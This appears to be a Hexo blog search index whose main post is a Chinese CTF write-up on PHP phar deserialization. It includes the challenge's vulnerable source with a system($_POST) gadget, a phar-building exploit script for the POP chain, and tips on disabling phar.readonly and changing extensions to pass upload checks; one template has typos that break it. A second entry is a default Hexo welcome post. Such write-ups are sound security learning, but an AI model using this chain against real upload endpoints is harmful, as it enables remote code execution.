<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下</p><p>先放上tg的源码</p><pre class="line-numbers language-language-python"><code class="language-language-python"><?phphighlight_file(__FILE__);error_reporting(0);function best64_decode($str){    return base64_encode(md5(base64_encode(md5($str))));    }class yesterday {    public $learn;    public $study="study";    public $try;    public function __construct()    {        $this->learn = "learn<br>";    }    public function __destruct()    {        echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this->did = "What you did makes you outstanding.<br>";    }    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this->good="You'll be good tommoraw!<br>";        echo $this->good;    }    public function __get($arg1){        $this->bad="You'll be bad tommoraw!<br>";    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this->out->useful7) {            echo "Seven is my lucky number<br>";            system('whoami');        }    }    public function __toString(){        echo "This is your future.<br>";        system($_POST["wow"]);        return "win";    }    public function __destruct(){        $this->no = "no";        return $this->no;    }}if (file_exists($_GET['filename'])){    echo "Focus on the previous step!<br>";}else{    $data=substr($_GET['filename'],0,-4);    unserialize(best64($data));}// You learn yesterday, you choose today, can you get to your future??><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较明显的特征就是无法正常进行反序列化(不可逆的md5加密)且存在文件上传的途径（这里没有放文件上传的源码）</p><p>我们先引入phar反序列化的概念</p><blockquote><p><strong>PHAR反序列化漏洞</strong>是与PHP中的对象反序列化相关的一种安全漏洞，特别是在处理PHAR文件时可能被利用。</p><p>概念解释：</p><p>PHAR文件：</p><p>PHAR 是一种类似于ZIP或TAR的归档格式，但它专门为PHP应用程序设计。一个PHAR文件可以包含PHP文件、图片、配置等内容，可以直接在PHP环境中执行。</p><p>PHAR反序列化漏洞： PHAR文件可以存储序列化的PHP对象。在某些情况下，PHP内置函数如file_exists()、is_file()等文件操作函数可以被用于处理包含PHAR存档的路径。例如，如果一个应用程序在未预期的情况下处理到PHAR文件并通过反序列化机制读取该文件，攻击者可以构造恶意的PHAR文件，使PHP反序列化攻击得以执行。</p></blockquote><p>对于晦涩的概念我向来无感，这里直接给上一个phar包(和jar包差不多)</p><p>比较重要的就是你要新建了一个类，还有一个就是setMetadata，这是核心</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(_FILE_);class Destiny{  public $he_say;}@unlink(filename:'test-phar');//删除之前的test-phar文件（如果存在)$phar=new Phar(filename:'test.phar');//创建一个Phar对象，文件名必须以phar为后缀，生成后可以随意修改$phar->startBuffering()；//开始写入文件$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 写入 stub$o = new Dest1ny();//这个是链子也可以放在 @前面$phar->setMetadata($o)；//写入元数据$phar->addFromString(localName:"test.txt",contents:"test"); //添加要压缩的文件$phar->stopBuffering（）；//停止写入文件并完成压缩?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看我的注释就很好明白，把链子当作元数据生成phar压缩文件传入后配合phar来进行反序列化（大概的流程就是这样）</p><p>那么tg的payload也就很好写出，只需要改一下链子</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phpclass yesterday {     public $learn;     public $study;     public $try;}class today {     public $doing;}class future{     }$y = new yesterday();$y-> study = new today();$y->study->doing=new future();@unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$phar->setMetadata($y); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算$phar->stopBuffering();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接运行，这边报错的话，需要改一下php.ini里的readonly，把ON改成OFF  </p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png"></p><p>第一个红框是文件头，第二个红框是setMetadata，而且如果php文件里有读取文件的函数，他一定会把setMetadata里的内容反序列化。</p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png"></p><p>更改后缀他的文件头是不变的，所以可以修改成任意的后缀（生成之后）</p>]]></content>
      
      
      <categories>
          
          <category> 序列化与反序列化 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar+文件上传 </tag>
            
            <tag> tgctf2025 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/16/hello-world/"/>
      <url>/2025/04/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>YUNiversity测试</p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
